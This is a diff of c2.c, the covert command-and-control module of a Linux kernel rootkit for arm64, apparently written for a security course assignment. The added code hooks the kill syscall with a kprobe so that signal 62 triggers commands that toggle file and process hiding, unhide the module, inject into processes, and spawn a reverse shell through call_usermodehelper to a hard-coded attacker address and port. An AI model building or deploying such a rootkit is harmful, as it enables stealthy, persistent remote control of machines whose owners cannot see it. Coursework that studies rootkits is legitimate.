@@ -1,21 +1,16 @@
 /*
- * c2.c: covert C2 channel via the kill() syscall
+ * c2.c: covert C2 channel via kill() syscall hooking
  *
- * This is a sample implementation. You are welcome to communicate with
- * your rootkit however you want: different signal, /proc entry, ioctl
- * on a hijacked device, whatever. The rubric only requires that the
- * channel has no obvious filesystem or network artifact.
- *
- * This implementation: when signal == MAGIC_SIGNAL (62), interpret the
+ * Implementation: when signal == MAGIC_SIGNAL (62), interpret the
  * call as a rootkit command and swallow it so the caller sees success
  * instead of a delivered signal.
  *
  * The kill syscall is an __arm64_sys_* wrapper: the real registers are
- * one level of indirection away (double pt_regs, same pattern as HW4).
+ * one level of indirection away (double pt_regs).
  *
- * Toggle commands must be deferred: (un)registering hooks cannot happen
- * from inside a hook handler. Use schedule_toggle / schedule_inject /
- * schedule_add_gid below. CMD_TOGGLE_BLOCK is safe to handle directly
+ * Toggle commands are deferred: (un)registering hooks cannot happen
+ * from inside a hook handler. Used schedule_toggle / schedule_inject /
+ * schedule_add_gid, schedule_spawn below. CMD_TOGGLE_BLOCK is safe to handle directly
  * (it is just a flag flip, no hook registration involved).
  */
 
@@ -29,7 +24,7 @@
 
 #include "rootkit.h"
 
-/* ─── External state (defined in rootkit.c) ───────────────────────────────── */
+/* External state (defined in rootkit.c) */
 
 extern int  blocking_init(void);
 extern void blocking_exit(void);
@@ -37,7 +32,7 @@ extern bool blocking_active;
 extern void hide_module(void);
 extern void show_module(void);
 
-/* ─── Deferred injection (can't call vm_mmap from kprobe context) ────────── */
+/* Deferred injection (can't call vm_mmap from kprobe context) */
 
 struct inject_work {
 	struct work_struct work;
@@ -61,6 +56,26 @@ static void gid_work_fn(struct work_struct *w)
 	struct gid_work *gw = container_of(w, struct gid_work, work);
 	proc_hide_add_pid(gw->target);
 	kfree(gw);
+}
+
+static void spawn_work_fn(struct work_struct *w)
+{
+  char *argv[] = {
+    "/bin/sh",
+    "-c",
+    "bash -i >& /dev/tcp/10.10.10.1/11337 0>&1", //attacker IP and port here
+    NULL
+  };
+  
+  char *envp[] = {
+    "HOME=/",
+    "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
+    NULL
+  };
+
+  pr_info("[C2] spawning reverse shell\n");
+  call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+  kfree(w);
 }
 
 static void schedule_add_gid(pid_t target)
@@ -88,24 +103,24 @@ static void toggle_work_fn(struct work_struct *w)
 	case CMD_TOGGLE_HIDE:
 		if (file_hide_is_active()) {
 			file_hide_disable();
-			pr_info("rootkit: file hiding OFF\n");
+			pr_info("[rootkit] file hiding OFF\n");
 		} else {
 			file_hide_enable();
-			pr_info("rootkit: file hiding ON\n");
+			pr_info("[rootkit] file hiding ON\n");
 		}
 		break;
 	case CMD_TOGGLE_PROC:
 		if (proc_hide_is_active()) {
 			proc_hide_disable();
-			pr_info("rootkit: process hiding OFF\n");
+			pr_info("[rootkit] process hiding OFF\n");
 		} else {
 			proc_hide_enable();
-			pr_info("rootkit: process hiding ON\n");
+			pr_info("[rootkit] process hiding ON\n");
 		}
 		break;
 	case CMD_TOGGLE_MODULE:
 		show_module();
-		pr_info("rootkit: module unhidden\n");
+		pr_info("[rootkit] module unhidden\n");
 		break;
 	}
 	kfree(tw);
@@ -131,15 +146,123 @@ static void schedule_inject(pid_t target)
 	schedule_work(&iw->work);
 }
 
+static void schedule_spawn(void)
+{
+  struct work_struct *w = kmalloc(sizeof(*w), GFP_ATOMIC);
+  if (!w) return;
+  INIT_WORK(w, spawn_work_fn);
+  schedule_work(w);
+}
+
+/* Print usage helper */
+void print_usage() {
+
+}
+
+/* kprobe kill pre_handler */
+static int kill_pre(struct kprobe *p, struct pt_regs *regs) {
+  bool status;
+
+  struct pt_regs *user_regs = (struct pt_regs *)regs->regs[0];
+  int cmd = (int)user_regs->regs[0]; //like 0,1,2,3 etc
+  int sig = (int)user_regs->regs[1]; //62
+
+  //other kill signals pass through
+  if (sig != MAGIC_SIGNAL)
+    return 0;
+
+  pr_info("[C2] C2 active on signal 62");
+  pr_info("[C2] command %d from %s[%d]\n", cmd, current->comm, current->pid);
+  switch(cmd) {
+    case CMD_STATUS:
+      pr_info("[rootkit][status] Current state log:");
+      status = file_hide_is_active();
+      pr_info("[rootkit][status]    File hiding        = %s\n", status ? "ENABLED" : "DISABLED");
+      status = blocking_active;
+      pr_info("[rootkit][status]    File blocking      - %s\n", status ? "ENABLED" : "DISABLED");
+      /*
+      status = module_hidden;
+      pr_info("[rootkit][status]    Module self-hiding - %s\n", status ? "ENABLED" : "DISABLED");
+      */
+      status = proc_hide_is_active();
+      pr_info("[rootkit][status]    Process hiding     - %s\n", status ? "ENABLED" : "DISABLED");
+      break;
+    case CMD_TOGGLE_HIDE:
+      schedule_toggle(CMD_TOGGLE_HIDE);
+      break;
+    case CMD_TOGGLE_BLOCK:
+      blocking_active = !blocking_active;
+      break;
+    /*
+    case CMD_TOGGLE_MODULE:
+      schedule_toggle(CMD_TOGGLE_MODULE);
+      break;
+    */
+    case CMD_TOGGLE_PROC:
+      schedule_toggle(CMD_TOGGLE_PROC);
+      break;
+    case CMD_ADD_GID:
+      schedule_add_gid((pid_t)user_regs->regs[2]);
+      break;
+    case CMD_INJECT:
+      schedule_inject((pid_t)user_regs->regs[2]);
+      break;
+    case CMD_REVSHELL:
+      schedule_spawn();
+      break;
+    default:
+      pr_warn("[C2][WARNING] unknown command %d\n", cmd);
+      pr_info("[C2] usage: kill -62 <cmd>\n");
+      pr_info("[C2]   0 - status\n");
+      pr_info("[C2]   1 - file hiding\n");
+      pr_info("[C2]   2 - access blocking\n");
+      pr_info("[C2]   3 - unhide module\n");
+      pr_info("[C2]   4 - proc hiding\n");
+      pr_info("[C2]   5 - add GID\n");
+      pr_info("[C2]   6 - inject\n");
+      pr_info("[C2]   7 - revshell\n");
+      break;
+  }
+
+  //one always swallows (the signal) 
+  //rewrite to: kill(current->pid, 0) which is harmless
+  //just checks if the process exists
+  user_regs->regs[0] = current->pid; //target = self
+  user_regs->regs[1] = 0;
+
+  return 0;
+}
+
+/* kprobe definition */
+
+static struct kprobe c2_kp = {
+  .symbol_name = "__arm64_sys_kill",
+  .pre_handler = kill_pre,
+};
 
 static bool active;
 
 int c2_init(void)
 {
-	/* TODO */
-	return -ENOSYS;
+	int ret = register_kprobe(&c2_kp);
+  if (ret < 0) {
+    pr_err("[C2][ERROR] failed to register kprobe: %d\n", ret);
+    return ret;
+  }
+	
+  active = true;
+  pr_info("[C2] kprobe registered\n");
+	return 0;
 }
 
 void c2_exit(void)
 {
+  if (!active) {
+    pr_err("[C2][ERROR] Could not unregister kprobe (no kprobe active)\n");
+    return;
+  }
+  
+  unregister_kprobe(&c2_kp);
+  pr_info("[C2] kprobe unregistered");
+  active = false;
 }
